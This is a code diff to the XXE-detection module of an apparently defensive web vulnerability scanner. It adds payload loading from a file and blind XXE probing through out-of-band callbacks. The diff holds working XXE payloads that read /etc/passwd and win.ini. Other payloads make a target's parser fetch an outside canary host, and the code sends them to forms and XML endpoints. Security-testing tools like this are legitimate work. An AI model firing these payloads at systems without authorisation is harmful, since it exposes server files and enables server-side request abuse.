@@ -3,12 +3,12 @@ from typing import List
 from scanner.core.scan_result import Finding, Severity
 from scanner.core.crawler import CrawlResult
 from scanner.utils.http import get_url_params, inject_url_param
+from scanner.utils.payloads import load_payloads
 
 UNIX_SIGNATURES = ["root:x:", "root:/root:", "/bin/bash", "daemon:x:"]
 WIN_SIGNATURES = ["[extensions]", "[fonts]", "for 16-bit app support"]
 
-XXE_PAYLOADS = [
-    # Classic file read
+_HARDCODED = [
     (
         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
         UNIX_SIGNATURES,
@@ -19,7 +19,6 @@ XXE_PAYLOADS = [
         WIN_SIGNATURES,
         "win.ini read",
     ),
-    # Parameter entity (some parsers only support these)
     (
         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root/>',
         UNIX_SIGNATURES,
@@ -27,11 +26,26 @@ XXE_PAYLOADS = [
     ),
 ]
 
+def _get_payloads() -> List[tuple]:
+    data = load_payloads("xxe")
+    if data and isinstance(data.get("payloads"), list):
+        try:
+            result = []
+            for p in data["payloads"]:
+                sigs = UNIX_SIGNATURES if p.get("target") == "unix" else WIN_SIGNATURES
+                result.append((p["payload"], sigs, p["label"]))
+            return result
+        except (KeyError, TypeError):
+            pass
+    return _HARDCODED
+
+XXE_PAYLOADS = _get_payloads()
+
 # Content types that indicate XML-accepting endpoints
 XML_CONTENT_TYPES = {"application/xml", "text/xml", "application/xhtml+xml", "application/soap+xml"}
 
 
-def test(page: CrawlResult, client: httpx.Client) -> List[Finding]:
+def test(page: CrawlResult, client: httpx.Client, oob=None) -> List[Finding]:
     findings = []
 
     # Test XML-accepting forms (rare but possible)
@@ -85,6 +99,30 @@ def test(page: CrawlResult, client: httpx.Client) -> List[Finding]:
             if matched:
                 findings.append(_finding(page.url, None, payload, label, matched))
                 break
+
+    # Blind XXE via OOB HTTP/DNS callback
+    if oob and not findings:
+        canary = oob.get_canary()
+        oob_payloads = [
+            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{canary}/xxe">]><root>&xxe;</root>',
+            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{canary}/xxe-param"> %xxe;]><root/>',
+        ]
+        for form in page.forms:
+            for oob_payload in oob_payloads:
+                try:
+                    client.request(form["method"].upper(), form["action"],
+                                   content=oob_payload,
+                                   headers={"Content-Type": "application/xml"}, timeout=5)
+                except Exception:
+                    pass
+        content_type = page.headers.get("content-type", "")
+        if any(ct in content_type for ct in XML_CONTENT_TYPES):
+            for oob_payload in oob_payloads:
+                try:
+                    client.post(page.url, content=oob_payload,
+                                headers={"Content-Type": "application/xml"}, timeout=5)
+                except Exception:
+                    pass
 
     return findings
 
